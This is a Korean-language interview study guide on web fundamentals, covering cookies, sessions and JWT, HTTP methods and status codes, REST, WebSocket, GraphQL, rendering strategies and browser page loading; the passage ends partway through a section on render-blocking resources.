# 10. 웹 개발 (Web Development)

---

## 1. 웹 기본 개념

### URL 구조 ◑

URL(Uniform Resource Locator)은 인터넷에서 리소스의 위치를 나타내는 주소다.

```
https://www.example.com:443/path/to/resource?query=value#fragment
└─┬─┘   └──────┬──────┘└┬┘└──────┬────────┘└────┬────┘└───┬───┘
scheme       host    port     path          query     fragment
```

각 구성요소의 역할은 다음과 같다:

| 구성요소 | 설명 | 예시 |
|---------|------|------|
| **Scheme** | 프로토콜 지정 | http, https, ftp, mailto |
| **Host** | 서버 도메인 또는 IP | www.example.com, 192.168.1.1 |
| **Port** | 서버 포트 번호 (생략 시 기본값) | HTTP: 80, HTTPS: 443 |
| **Path** | 서버 내 리소스 경로 | /users/profile |
| **Query** | 추가 파라미터 (key=value 형식) | ?id=123&sort=name |
| **Fragment** | 문서 내 특정 위치 (서버로 전송 안됨) | #section-1 |

Query String과 Fragment의 차이를 이해하는 것이 중요하다. Query String(`?key=value`)은 서버로 전송되어 동적 페이지 생성에 사용되지만, Fragment(`#anchor`)는 브라우저에서만 처리되어 페이지 내 특정 위치로 스크롤하는 데 사용된다. SPA(Single Page Application)에서는 Fragment를 라우팅에 활용하기도 한다 (Hash Router).

### ⭕ 쿠키, 세션, 토큰의 차이는?

웹 애플리케이션에서 사용자 상태를 유지하는 세 가지 방식이다. HTTP는 기본적으로 Stateless(무상태)이기 때문에 요청 간에 사용자를 식별하려면 별도의 메커니즘이 필요하다.

#### 쿠키 (Cookie) ◑

쿠키는 서버가 클라이언트(브라우저)에 저장하는 작은 텍스트 데이터다.

```
클라이언트                           서버
    |                                 |
    |---- 로그인 요청 --------------->|
    |                                 |
    |<--- Set-Cookie: session=abc ----|  (서버가 쿠키 설정)
    |                                 |
    |---- 요청 + Cookie: session=abc ->|  (이후 요청마다 자동 전송)
    |                                 |
```

쿠키의 주요 속성:

| 속성 | 설명 |
|-----|------|
| **Expires/Max-Age** | 만료 시간 설정 (없으면 세션 쿠키) |
| **Domain** | 쿠키가 전송될 도메인 |
| **Path** | 쿠키가 전송될 경로 |
| **Secure** | HTTPS에서만 전송 |
| **HttpOnly** | JavaScript에서 접근 불가 (XSS 방어) |
| **SameSite** | CSRF 방어 (Strict/Lax/None) |

쿠키는 도메인당 약 4KB, 총 개수 제한이 있다. 민감한 정보를 직접 저장하지 않고, 세션 ID나 토큰을 저장하는 용도로 주로 사용한다.

#### 세션 (Session) ◑

세션은 사용자 상태 정보를 서버에 저장하는 방식이다. 클라이언트는 세션 ID만 쿠키로 보관하고, 실제 데이터는 서버 메모리나 외부 저장소(Redis 등)에 저장된다.

```
클라이언트                           서버 (메모리/Redis)
    |                                 |
    |---- 로그인 요청 --------------->|
    |                                 |  세션 생성: { id: "abc", user: "kim" }
    |<--- Set-Cookie: JSESSIONID=abc -|
    |                                 |
    |---- Cookie: JSESSIONID=abc ---->|
    |                                 |  세션 조회 → user: "kim" 확인
```

세션의 장점:
- 민감한 데이터가 서버에 안전하게 저장됨
- 클라이언트에서 데이터 조작 불가

세션의 단점:
- 서버 메모리 사용 (동시 사용자가 많으면 부담)
- 서버 확장(Scale-out) 시 세션 공유 필요 (Sticky Session 또는 Redis 사용)

#### 토큰 (JWT) ◑

JWT(JSON Web Token)는 사용자 정보를 클라이언트에 저장하되, 서버가 서명하여 위변조를 방지하는 방식이다.

```
클라이언트                           서버
    |                                 |
    |---- 로그인 요청 --------------->|
    |                                 |  JWT 생성 (서버 비밀키로 서명)
    |<--- JWT 토큰 반환 --------------|
    |                                 |
    | (토큰을 localStorage 또는 쿠키에 저장)
    |                                 |
    |---- Authorization: Bearer JWT -->|
    |                                 |  서명 검증 → 페이로드에서 사용자 정보 추출
```

JWT의 구조:

```
xxxxx.yyyyy.zzzzz
  |      |     |
Header.Payload.Signature

Header: { "alg": "HS256", "typ": "JWT" }  → Base64 인코딩
Payload: { "sub": "1234", "name": "Kim", "exp": 1735689600 }  → Base64 인코딩
Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)
```

JWT의 장점:
- **Stateless**: 서버가 상태를 저장하지 않아 확장성이 좋음
- 자체적으로 사용자 정보 포함 (DB 조회 없이 인증 가능)

JWT의 단점:
- 토큰 크기가 세션 ID보다 큼 (매 요청마다 전송)
- 한번 발급된 토큰은 만료 전까지 무효화 어려움 (로그아웃 처리 복잡)
- Payload는 암호화가 아닌 인코딩 (민감 정보 포함 금지)

#### 비교 요약 ◑

| 구분 | 쿠키 | 세션 | JWT |
|------|------|------|-----|
| 저장 위치 | 클라이언트 | 서버 | 클라이언트 |
| 서버 상태 | Stateless 가능 | Stateful | Stateless |
| 용량 | ~4KB | 제한 없음 | ~8KB (권장) |
| 확장성 | 좋음 | 세션 공유 필요 | 좋음 |
| 보안 | HttpOnly로 XSS 방어 | 서버에 데이터 저장 | 서명으로 위변조 방지 |
| 용도 | 세션 ID/토큰 저장 | 인증 정보 저장 | 인증/인가 |

---

## 2. HTTP ◑

HTTP(HyperText Transfer Protocol)는 웹에서 클라이언트와 서버 간 통신을 위한 프로토콜이다. 1991년 HTTP/0.9부터 시작해 현재 HTTP/3까지 발전했다.

### HTTP의 특징 ◑

1. **요청-응답 모델**: 클라이언트가 요청하고 서버가 응답
2. **Stateless**: 각 요청이 독립적 (이전 요청 정보 저장 안함)
3. **텍스트 기반**: 사람이 읽을 수 있는 형태 (HTTP/2부터 바이너리)

### HTTP 메서드 ◑

| 메서드 | 용도 | 안전 | 멱등성 | Request Body |
|--------|------|------|--------|--------------|
| GET | 리소스 조회 | O | O | 없음 |
| POST | 리소스 생성 | X | X | 있음 |
| PUT | 리소스 전체 수정 | X | O | 있음 |
| PATCH | 리소스 부분 수정 | X | X | 있음 |
| DELETE | 리소스 삭제 | X | O | 선택적 |
| OPTIONS | 지원 메서드 확인 | O | O | 없음 |
| HEAD | 헤더만 조회 | O | O | 없음 |

**안전(Safe)**: 리소스를 변경하지 않는다. GET, HEAD, OPTIONS는 안전한 메서드로, 캐싱이나 프리페치에 사용할 수 있다.

**멱등성(Idempotent)**: 동일한 요청을 여러 번 보내도 결과가 같다. 네트워크 오류로 재시도해도 부작용이 없다.

PUT과 PATCH의 차이를 이해하는 것이 중요하다:

```javascript
// 기존 데이터: { "name": "Kim", "age": 25, "email": "kim@example.com" }

// PUT: 전체 교체 (모든 필드 전송 필요)
PUT /users/1
{ "name": "Kim", "age": 26, "email": "kim@example.com" }

// PATCH: 부분 수정 (변경할 필드만 전송)
PATCH /users/1
{ "age": 26 }
```

### ⭕ GET과 POST의 차이는? ◑

| 구분 | GET | POST |
|------|-----|------|
| 용도 | 조회 (데이터 가져오기) | 생성/처리 (데이터 전송) |
| 데이터 전송 | URL 쿼리스트링 | Request Body |
| 데이터 길이 | URL 길이 제한 (~2000자) | 제한 없음 |
| 캐싱 | 가능 (브라우저/CDN) | 불가능 |
| 멱등성 | O (여러 번 호출해도 동일) | X (호출마다 리소스 생성 가능) |
| 북마크 | 가능 (URL에 데이터 포함) | 불가능 |
| 보안 | 낮음 (URL에 노출, 히스토리 저장) | 상대적으로 높음 (Body는 로그에 안 남음) |
| 브라우저 뒤로가기 | 이전 결과 표시 | 재전송 확인 필요 |

주의할 점: POST가 "보안적으로 더 안전하다"고 오해하는 경우가 있는데, HTTPS 없이는 GET이든 POST든 데이터가 평문으로 전송된다. POST의 이점은 URL에 데이터가 노출되지 않아 로그나 브라우저 히스토리에 남지 않는다는 것이다.

### HTTP 상태 코드 ◑

서버의 응답 상태를 나타내는 3자리 숫자다.

| 범위 | 의미 | 설명 |
|------|------|------|
| 1xx | 정보 | 요청 수신, 처리 계속 |
| 2xx | 성공 | 요청 성공적 처리 |
| 3xx | 리다이렉션 | 추가 동작 필요 |
| 4xx | 클라이언트 오류 | 요청 오류 |
| 5xx | 서버 오류 | 서버 처리 실패 |

자주 사용되는 상태 코드:

| 코드 | 이름 | 설명 |
|------|------|------|
| **200** | OK | 요청 성공 |
| **201** | Created | 리소스 생성 성공 (POST 응답) |
| **204** | No Content | 성공했지만 응답 본문 없음 (DELETE 응답) |
| **301** | Moved Permanently | 영구 이동 (URL 변경, 캐싱됨) |
| **302** | Found | 임시 이동 (원래 URL 유지) |
| **304** | Not Modified | 캐시 사용 (리소스 변경 없음) |
| **400** | Bad Request | 잘못된 요청 형식 |
| **401** | Unauthorized | 인증 필요 (로그인 안됨) |
| **403** | Forbidden | 권한 없음 (로그인했지만 접근 불가) |
| **404** | Not Found | 리소스 없음 |
| **405** | Method Not Allowed | 허용되지 않은 HTTP 메서드 |
| **429** | Too Many Requests | 요청 과다 (Rate Limiting) |
| **500** | Internal Server Error | 서버 내부 오류 |
| **502** | Bad Gateway | 게이트웨이/프록시 오류 |
| **503** | Service Unavailable | 서비스 일시 중단 (과부하/점검) |
| **504** | Gateway Timeout | 게이트웨이 타임아웃 |

401과 403의 차이: 401은 "누구인지 모르겠으니 인증하라"이고, 403은 "누구인지 알지만 권한이 없다"이다.

### ⭕ HTTP와 HTTPS의 차이는? ◑

| 구분 | HTTP | HTTPS |
|------|------|-------|
| 보안 | 암호화 없음 (평문 전송) | TLS/SSL 암호화 |
| 포트 | 80 | 443 |
| 성능 | 빠름 | TLS 핸드셰이크 오버헤드 |
| 인증서 | 불필요 | SSL/TLS 인증서 필요 |
| SEO | 불리 | 검색 엔진 우대 |
| 브라우저 표시 | "주의 요함" | 자물쇠 아이콘 |

HTTPS는 HTTP에 TLS(Transport Layer Security) 암호화를 추가한 것이다. 암호화 과정:

```
클라이언트                              서버
    |                                    |
    |---- ClientHello (지원 암호화 목록) ->|
    |                                    |
    |<--- ServerHello + 인증서 ----------|
    |                                    |
    |  (인증서 검증, 공개키 추출)           |
    |                                    |
    |---- 세션키 생성, 공개키로 암호화 ---->|
    |                                    |
    |<--- 세션키로 암호화 통신 시작 ------>|
```

HTTP/2와 HTTP/3 대부분의 구현이 HTTPS를 전제로 하기 때문에, 현대 웹에서 HTTPS는 사실상 필수다.

### HTTP 버전 비교 ◑

| 버전 | 특징 |
|------|------|
| **HTTP/1.0** | 요청마다 TCP 연결 (비효율적) |
| **HTTP/1.1** | Keep-Alive (연결 재사용), 파이프라이닝 |
| **HTTP/2** | 멀티플렉싱, 헤더 압축, 서버 푸시 |
| **HTTP/3** | QUIC(UDP 기반), 연결 설정 빠름 |

HTTP/1.1의 Head-of-Line Blocking 문제: 하나의 연결에서 앞선 요청이 지연되면 뒤의 요청도 대기해야 한다. HTTP/2의 멀티플렉싱은 이를 해결하여 하나의 연결에서 여러 요청/응답을 병렬로 처리한다.

---

## 3. REST API

REST(REpresentational State Transfer)는 웹 아키텍처 스타일로, HTTP 프로토콜을 기반으로 리소스를 URL로 표현하고 HTTP 메서드로 조작한다.

### REST 핵심 원칙 ◑

1. **리소스 기반 (Resource-Based)**: 모든 것을 리소스로 표현하고 URL로 식별
2. **HTTP 메서드 활용**: CRUD 작업에 적절한 메서드 사용
3. **무상태 (Stateless)**: 서버가 클라이언트 상태를 저장하지 않음
4. **일관된 인터페이스 (Uniform Interface)**: 일관된 방식으로 리소스 접근

### CRUD와 HTTP 메서드 매핑 ◑

| 작업 | HTTP 메서드 | URL 예시 | 설명 |
|------|------------|----------|------|
| Create | POST | POST /users | 새 사용자 생성 |
| Read | GET | GET /users/1 | ID가 1인 사용자 조회 |
| Update | PUT/PATCH | PUT /users/1 | ID가 1인 사용자 수정 |
| Delete | DELETE | DELETE /users/1 | ID가 1인 사용자 삭제 |
| List | GET | GET /users | 전체 사용자 목록 |

### RESTful API 설계 가이드 ◑

좋은 REST API는 URL만 보고도 어떤 리소스에 대한 어떤 작업인지 알 수 있어야 한다.

| 원칙 | 좋은 예 | 나쁜 예 | 이유 |
|------|---------|---------|------|
| 명사 사용 | `/users` | `/getUsers` | HTTP 메서드가 동작을 표현 |
| 복수형 | `/users/1` | `/user/1` | 컬렉션 개념 일관성 |
| 계층 구조 | `/users/1/posts` | `/getUserPosts?id=1` | 관계를 URL로 표현 |
| 소문자+하이픈 | `/user-profiles` | `/userProfiles` | URL 가독성, 대소문자 혼란 방지 |
| 필터링은 쿼리로 | `/users?role=admin` | `/admin-users` | 필터는 리소스가 아님 |

복잡한 관계 표현 예시:

```
GET  /users/1/posts          # 사용자 1의 게시글 목록
POST /users/1/posts          # 사용자 1이 새 게시글 작성
GET  /users/1/posts/5        # 사용자 1의 게시글 5 조회
GET  /posts/5/comments       # 게시글 5의 댓글 목록
```

### REST API 응답 설계 ◑

일관된 응답 형식은 클라이언트 개발을 용이하게 한다.

```json
// 성공 응답
{
  "status": "success",
  "data": {
    "id": 1,
    "name": "Kim",
    "email": "kim@example.com"
  }
}

// 목록 응답 (페이지네이션 포함)
{
  "status": "success",
  "data": [...],
  "pagination": {
    "page": 1,
    "limit": 20,
    "total": 100,
    "totalPages": 5
  }
}

// 에러 응답
{
  "status": "error",
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "이메일 형식이 올바르지 않습니다.",
    "field": "email"
  }
}
```

### REST의 한계와 대안 ◑

REST의 문제점:

1. **Over-fetching**: 필요 이상의 데이터 반환
   ```
   GET /users/1  → { id, name, email, address, phone, ... }
   (실제로는 name만 필요한 경우)
   ```

2. **Under-fetching**: 여러 요청 필요
   ```
   GET /users/1           → 사용자 정보
   GET /users/1/posts     → 게시글 목록
   GET /users/1/followers → 팔로워 목록
   (한 화면에 모두 필요하지만 3번 요청)
   ```

3. **버전 관리**: URL에 버전 포함 필요 (`/v1/users`, `/v2/users`)

이러한 한계를 해결하기 위해 GraphQL이 등장했다.

---

## 4. 실시간 통신 ◑

### ⭕ WebSocket이란?

WebSocket은 클라이언트와 서버 간 양방향 실시간 통신을 위한 프로토콜이다. HTTP와 달리 한 번 연결을 맺으면 양쪽에서 자유롭게 데이터를 주고받을 수 있다.

### HTTP vs WebSocket ◑

```
[HTTP 통신]
클라이언트                    서버
    |--- 요청 1 ------------->|
    |<-- 응답 1 --------------|
    |--- 요청 2 ------------->|
    |<-- 응답 2 --------------|
    (매번 요청해야 응답)

[WebSocket 통신]
클라이언트                    서버
    |=== 연결 수립 ===========|
    |<-- 서버 메시지 ---------|   (서버가 먼저 보낼 수 있음)
    |--- 클라이언트 메시지 --->|
    |<-- 서버 메시지 ---------|
    |--- 클라이언트 메시지 --->|
    (연결 유지, 양방향 통신)
```

| 구분 | HTTP | WebSocket |
|------|------|-----------|
| 연결 | 요청-응답 후 종료 (또는 Keep-Alive) | 지속적 연결 유지 |
| 방향 | 단방향 (클라이언트 → 서버 요청) | 양방향 |
| 오버헤드 | 매 요청마다 헤더 전송 | 초기 핸드셰이크 후 경량 프레임 |
| 프로토콜 | `http://` / `https://` | `ws://` / `wss://` |
| 적합 용도 | 일반 웹 페이지, API | 실시간 채팅, 게임, 주식 시세 |

### WebSocket 핸드셰이크 ◑

WebSocket 연결은 HTTP Upgrade 요청으로 시작된다.

```
[1. 클라이언트 → 서버: HTTP Upgrade 요청]
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

[2. 서버 → 클라이언트: 101 Switching Protocols]
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

[3. 이후 WebSocket 프레임으로 양방향 통신]
```

`Sec-WebSocket-Key`와 `Sec-WebSocket-Accept`는 연결이 실제 WebSocket 요청인지 검증하는 데 사용된다. 서버는 클라이언트가 보낸 Key에 고정된 GUID를 붙여 SHA-1 해시 후 Base64 인코딩하여 Accept 값을 생성한다.

### 실시간 통신 대안 기술 비교 ◑

WebSocket 외에도 실시간성을 구현하는 여러 방법이 있다.

#### Polling (폴링) ◑

클라이언트가 주기적으로 서버에 요청하는 방식이다.

```
클라이언트                    서버
    |--- 새 데이터 있어? ------>|
    |<-- 없음 ----------------|
    |   (1초 대기)             |
    |--- 새 데이터 있어? ------>|
    |<-- 없음 ----------------|
    |   (1초 대기)             |
    |--- 새 데이터 있어? ------>|
    |<-- 새 메시지 도착! ------|
```

장점: 구현 간단, 모든 환경에서 동작
단점: 불필요한 요청 많음, 서버 부하, 실시간성 낮음

#### Long Polling (롱 폴링) ◑

서버가 데이터가 생길 때까지 응답을 지연시키는 방식이다.

```
클라이언트                    서버
    |--- 새 데이터 있어? ------>|
    |   (서버가 대기...)        |
    |   (새 데이터 발생!)       |
    |<-- 새 메시지! -----------|
    |--- 새 데이터 있어? ------>|  (즉시 재연결)
    |   (서버가 대기...)        |
```

장점: 폴링보다 불필요한 요청 적음, 실시간에 가까움
단점: 서버 연결 점유, 타임아웃 관리 필요

#### SSE (Server-Sent Events) ◑

서버에서 클라이언트로 단방향 스트림을 제공하는 방식이다.

```
클라이언트                    서버
    |--- SSE 연결 요청 ------->|
    |<== 연결 유지 ============|
    |<-- event: message -------|
    |<-- event: update --------|
    |<-- event: notification --|
    (서버 → 클라이언트 단방향)
```

```javascript
// 클라이언트 코드
const eventSource = new EventSource('/events');
eventSource.onmessage = (event) => {
  console.log('새 메시지:', event.data);
};
```

장점: HTTP 기반이라 프록시/방화벽 친화적, 자동 재연결
단점: 단방향 (클라이언트 → 서버는 별도 요청 필요)

#### 기술 선택 가이드 ◑

| 기술 | 방향 | 실시간성 | 적합한 경우 |
|------|------|----------|-------------|
| Polling | 단방향 | 낮음 | 간단한 구현, 레거시 환경 |
| Long Polling | 단방향 | 중간 | WebSocket 불가 환경 |
| SSE | 서버→클라 | 높음 | 알림, 피드, 주가 등 서버 푸시 |
| WebSocket | 양방향 | 높음 | 채팅, 게임, 협업 도구 |

---

## 5. GraphQL ◑

GraphQL은 Facebook이 2015년에 공개한 API 쿼리 언어다. REST의 Over-fetching과 Under-fetching 문제를 해결한다.

### ⭕ REST와 GraphQL의 차이는?

| 구분 | REST | GraphQL |
|------|------|---------|
| 엔드포인트 | 리소스별 다수 (`/users`, `/posts`) | 단일 (`/graphql`) |
| 데이터 요청 | 서버가 정의한 고정 구조 | 클라이언트가 필요한 필드 지정 |
| Over-fetching | 불필요한 데이터도 받음 | 요청한 것만 받음 |
| Under-fetching | 여러 엔드포인트 호출 필요 | 한 번에 관련 데이터 조회 |
| 타입 시스템 | 없음 (별도 스키마 정의 필요) | 스키마로 타입 강제 |
| 버저닝 | URL 버저닝 (`/v1/`, `/v2/`) | 스키마 진화로 불필요 |
| 캐싱 | HTTP 캐싱 활용 용이 | 별도 캐싱 전략 필요 |
| 학습 곡선 | 낮음 | 높음 |

### GraphQL 기본 개념 ◑

| 개념 | 설명 | 예시 |
|------|------|------|
| **Query** | 데이터 조회 (GET과 유사) | `query { user(id: 1) { name } }` |
| **Mutation** | 데이터 변경 (POST/PUT/DELETE와 유사) | `mutation { createUser(...) }` |
| **Subscription** | 실시간 업데이트 구독 | `subscription { newMessage { ... } }` |
| **Schema** | API 타입 정의 (SDL: Schema Definition Language) | `type User { id: ID!, name: String }` |
| **Resolver** | 스키마 필드의 실제 데이터를 가져오는 함수 | DB 조회, API 호출 등 |

### GraphQL 예시 ◑

REST에서 3번 요청해야 할 것을 GraphQL은 한 번에 처리한다.

```graphql
# GraphQL Query
query {
  user(id: "1") {
    name
    email
    posts(first: 5) {
      title
      createdAt
    }
    followers {
      name
    }
  }
}

# 응답 (요청한 필드만 반환)
{
  "data": {
    "user": {
      "name": "Kim",
      "email": "kim@example.com",
      "posts": [
        { "title": "Hello", "createdAt": "2024-01-01" },
        { "title": "World", "createdAt": "2024-01-02" }
      ],
      "followers": [
        { "name": "Lee" },
        { "name": "Park" }
      ]
    }
  }
}
```

같은 데이터를 REST로 가져오려면:

```
GET /users/1              → { id, name, email, phone, address, ... }
GET /users/1/posts?limit=5 → [{ id, title, body, author, createdAt, ... }, ...]
GET /users/1/followers    → [{ id, name, email, ... }, ...]
```

### GraphQL의 장단점 ◑

장점:
- 클라이언트가 필요한 데이터만 요청 가능
- 하나의 요청으로 여러 리소스 조회
- 강력한 타입 시스템과 자동 문서화
- API 진화가 쉬움 (필드 추가는 기존 클라이언트에 영향 없음)

단점:
- 서버 구현 복잡도 증가
- HTTP 캐싱 활용 어려움 (POST 요청이기 때문)
- N+1 쿼리 문제 (DataLoader로 해결 필요)
- 단순한 CRUD에는 오버킬

### GraphQL vs REST 선택 기준 ◑

| 상황 | 추천 |
|------|------|
| 다양한 클라이언트 (웹, 모바일, IoT) | GraphQL |
| 간단한 CRUD API | REST |
| 복잡한 데이터 관계 조회 | GraphQL |
| HTTP 캐싱 중요 | REST |
| 빠른 개발, 적은 학습 | REST |
| 프론트엔드 주도 개발 | GraphQL |

---

## 6. 웹 렌더링 방식 ◑

웹 페이지가 사용자 브라우저에 표시되기까지의 과정은 렌더링 방식에 따라 다르다. 렌더링 위치(서버 vs 클라이언트)와 시점(빌드 vs 요청)에 따라 여러 방식이 존재한다.

### ⭕ CSR과 SSR의 차이는?

#### CSR (Client-Side Rendering) ◑

브라우저(클라이언트)에서 JavaScript로 HTML을 생성하는 방식이다. React, Vue, Angular 같은 SPA 프레임워크가 대표적이다.

```
[CSR 동작 과정]

1. 브라우저가 서버에 요청
   GET /app → 서버는 거의 빈 HTML 반환

2. 초기 HTML (index.html)
   <html>
     <body>
       <div id="root"></div>        ← 비어있음
       <script src="bundle.js">     ← JavaScript 다운로드
     </body>
   </html>

3. JavaScript 실행
   - bundle.js 다운로드 및 파싱
   - React/Vue 앱 초기화
   - API 호출로 데이터 fetch
   - DOM 생성 및 화면 렌더링

4. 이후 페이지 이동
   - 전체 페이지 새로고침 없이
   - JavaScript가 URL 변경 + 컴포넌트 교체
```

CSR의 특징:
- **초기 로딩 느림**: 빈 HTML → JS 다운로드 → 실행 → 렌더링
- **이후 네비게이션 빠름**: 전체 페이지 리로드 없이 컴포넌트만 교체
- **SEO 불리**: 검색 엔진 크롤러가 빈 HTML만 볼 수 있음
- **서버 부하 낮음**: 정적 파일만 서빙

#### SSR (Server-Side Rendering) ◑

서버에서 완성된 HTML을 생성하여 클라이언트에 전송하는 방식이다. Next.js, Nuxt.js가 대표적이다.

```
[SSR 동작 과정]

1. 브라우저가 서버에 요청
   GET /users/1 → 서버가 완성된 HTML 반환

2. 서버 처리
   - 요청 URL 분석
   - DB/API에서 데이터 조회
   - React/Vue 컴포넌트를 HTML로 렌더링
   - 완성된 HTML 전송

3. 초기 HTML (완성된 상태)
   <html>
     <body>
       <div id="root">
         <h1>사용자: Kim</h1>      ← 내용이 채워져 있음
         <p>이메일: kim@test.com</p>
       </div>
       <script src="bundle.js">
     </body>
   </html>

4. Hydration (수화)
   - JavaScript 다운로드
   - 기존 HTML에 이벤트 핸들러 연결
   - 인터랙티브한 앱으로 변환
```

SSR의 특징:
- **초기 로딩 빠름**: 완성된 HTML 즉시 표시
- **SEO 유리**: 검색 엔진이 완성된 콘텐츠 수집
- **서버 부하 높음**: 매 요청마다 서버에서 렌더링
- **TTFB 증가**: 서버 렌더링 시간만큼 응답 지연

### CSR vs SSR 비교 ◑

| 구분 | CSR | SSR |
|------|-----|-----|
| 렌더링 위치 | 브라우저 | 서버 |
| 초기 로딩 (FCP) | 느림 | 빠름 |
| 이후 탐색 | 빠름 (SPA) | 페이지마다 서버 요청 |
| SEO | 불리 (빈 HTML) | 유리 (완성된 HTML) |
| 서버 부하 | 낮음 | 높음 |
| TTFB | 빠름 | 느림 (렌더링 시간) |
| 인터랙션 | JS 로드 후 가능 | Hydration 후 가능 |

### 기타 렌더링 방식 ◑

#### SSG (Static Site Generation) ◑

빌드 시점에 HTML을 미리 생성해두는 방식이다.

```
[빌드 시]
/posts/1.md → /posts/1.html  (미리 생성)
/posts/2.md → /posts/2.html
/about.md   → /about.html

[요청 시]
GET /posts/1 → 미리 생성된 HTML 즉시 반환 (빠름!)
```

장점: 가장 빠른 응답, CDN 캐싱 용이
단점: 빌드 시 데이터가 확정되어야 함, 자주 변경되는 콘텐츠 부적합

적합한 경우: 블로그, 문서 사이트, 마케팅 페이지

#### ISR (Incremental Static Regeneration) ◑

SSG + 주기적 재생성을 결합한 방식이다. Next.js에서 제공한다.

```
[동작 방식]
1. 빌드 시 초기 HTML 생성
2. 요청 시 캐시된 HTML 반환
3. 설정된 시간(revalidate) 경과 후:
   - 다음 요청에 기존 캐시 반환 (사용자 대기 없음)
   - 백그라운드에서 페이지 재생성
   - 이후 요청부터 새 페이지 제공
```

장점: SSG의 성능 + 주기적 업데이트
단점: 완전한 실시간은 아님

적합한 경우: 자주 변경되는 정적 콘텐츠 (e-commerce 상품 페이지, 뉴스)

### 렌더링 방식 선택 가이드 ◑

| 방식 | 적합한 경우 | 예시 |
|------|-------------|------|
| **CSR** | 인터랙션 많은 앱, SEO 불필요 | 대시보드, 관리자 페이지, SaaS |
| **SSR** | SEO 중요, 동적 콘텐츠 | 뉴스, SNS 피드, 검색 결과 |
| **SSG** | 변경 적은 콘텐츠 | 블로그, 문서, 랜딩 페이지 |
| **ISR** | 자주 변경되는 정적 사이트 | 이커머스, 뉴스 |

현대 프레임워크(Next.js, Nuxt.js)는 페이지별로 다른 렌더링 방식을 선택할 수 있어, 각 페이지 특성에 맞는 최적의 방식을 적용할 수 있다.

### Hydration ◑

Hydration(수화)은 SSR로 전송된 정적 HTML에 JavaScript를 연결하여 인터랙티브하게 만드는 과정이다.

```
[Hydration 과정]

1. 서버에서 완성된 HTML 수신
   <button id="like">좋아요 (10)</button>

2. 사용자는 바로 콘텐츠를 볼 수 있음
   (하지만 버튼 클릭 안 됨 - JS가 아직 연결 안 됨)

3. JavaScript 다운로드 및 실행
   - React가 기존 HTML과 Virtual DOM 비교
   - onClick 핸들러 등 이벤트 연결

4. Hydration 완료
   - 버튼 클릭 가능
   - 완전한 인터랙티브 앱
```

Hydration의 문제점과 해결책:

| 문제 | 설명 | 해결책 |
|------|------|--------|
| **불일치(Mismatch)** | 서버/클라이언트 렌더링 결과 다름 | 동일한 코드, 동일한 데이터 사용 |
| **긴 TTI** | HTML은 보이지만 인터랙션 불가 | Partial Hydration, Islands Architecture |
| **큰 번들** | 전체 JS 다운로드 필요 | Code Splitting, Lazy Loading |

---

## 7. 브라우저 동작 ◑

### ⭕ 브라우저에 URL을 입력하면 무슨 일이 일어나는가?

면접 단골 질문으로, 네트워킹부터 렌더링까지 웹의 전체 동작을 이해하고 있는지 확인한다.

```
[전체 과정 다이어그램]

사용자 입력: www.example.com
         │
         ▼
    ┌─────────────┐
    │  DNS 조회   │  도메인 → IP 주소 변환
    └─────────────┘
         │
         ▼
    ┌─────────────┐
    │  TCP 연결   │  3-way handshake
    └─────────────┘
         │
         ▼
    ┌─────────────┐
    │ TLS 핸드셰이크│  HTTPS인 경우
    └─────────────┘
         │
         ▼
    ┌─────────────┐
    │  HTTP 요청  │  GET / HTTP/1.1
    └─────────────┘
         │
         ▼
    ┌─────────────┐
    │  서버 응답  │  HTML 반환
    └─────────────┘
         │
         ▼
    ┌─────────────┐
    │ 파싱/렌더링 │  DOM, CSSOM, 렌더 트리
    └─────────────┘
         │
         ▼
      화면 표시
```

#### 1. DNS 조회 ◑

도메인 이름을 IP 주소로 변환한다.

```
www.example.com → 93.184.216.34

[DNS 조회 순서]
1. 브라우저 캐시 확인
2. OS 캐시 확인 (hosts 파일 포함)
3. 라우터 캐시 확인
4. ISP DNS 서버 조회
5. 루트 DNS → TLD DNS (.com) → 권한 있는 DNS 서버
```

#### 2. TCP 연결 ◑

IP 주소로 서버와 연결을 수립한다.

```
클라이언트                    서버
    |--- SYN ---------------->|
    |<-- SYN + ACK -----------|
    |--- ACK ---------------->|
    (3-way handshake 완료)
```

#### 3. TLS 핸드셰이크 (HTTPS인 경우) ◑

암호화 통신을 위한 키를 교환한다.

```
클라이언트                    서버
    |--- ClientHello -------->|  (지원 암호화 알고리즘)
    |<-- ServerHello ---------|  (선택된 알고리즘, 인증서)
    |--- 키 교환 ------------>|  (세션 키 생성)
    |<-- Finished ------------|
```

#### 4. HTTP 요청/응답 ◑

```
[요청]
GET / HTTP/1.1
Host: www.example.com
User-Agent: Chrome/120.0
Accept: text/html

[응답]
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1234

<!DOCTYPE html>
<html>...
```

#### 5. 파싱 및 렌더링 ◑

브라우저가 HTML을 화면에 표시하는 과정이다.

### 브라우저 렌더링 과정 ◑

```
HTML 문서
    │
    ▼
┌─────────────┐
│  HTML 파싱  │ ──────┐
│   (DOM 트리) │       │
└─────────────┘       │
                      ▼
CSS 파일          ┌─────────────┐
    │            │  렌더 트리   │
    ▼            │   구성      │
┌─────────────┐  │             │
│  CSS 파싱   │ ──┘             │
│ (CSSOM 트리) │               │
└─────────────┘               │
                              ▼
                       ┌─────────────┐
                       │   레이아웃  │  요소 위치/크기 계산
                       └─────────────┘
                              │
                              ▼
                       ┌─────────────┐
                       │    페인트   │  픽셀로 변환
                       └─────────────┘
                              │
                              ▼
                       ┌─────────────┐
                       │    합성     │  레이어 합성
                       └─────────────┘
                              │
                              ▼
                          화면 표시
```

각 단계 설명:

| 단계 | 설명 |
|------|------|
| **DOM 생성** | HTML을 파싱하여 DOM(Document Object Model) 트리 구성 |
| **CSSOM 생성** | CSS를 파싱하여 CSSOM(CSS Object Model) 트리 구성 |
| **렌더 트리** | DOM + CSSOM 결합, 화면에 표시될 요소만 포함 (`display: none` 제외) |
| **레이아웃** | 각 요소의 정확한 위치와 크기 계산 (Reflow) |
| **페인트** | 레이아웃 정보를 바탕으로 픽셀로 변환 |
| **합성** | 여러 레이어를 합쳐 최종 화면 구성 (GPU 가속) |

#### 렌더링 차단과 최적화 ◑

```html
<!-- CSS는 렌더링 차단 리소스 -->
<link rel="stylesheet" href="style.css">

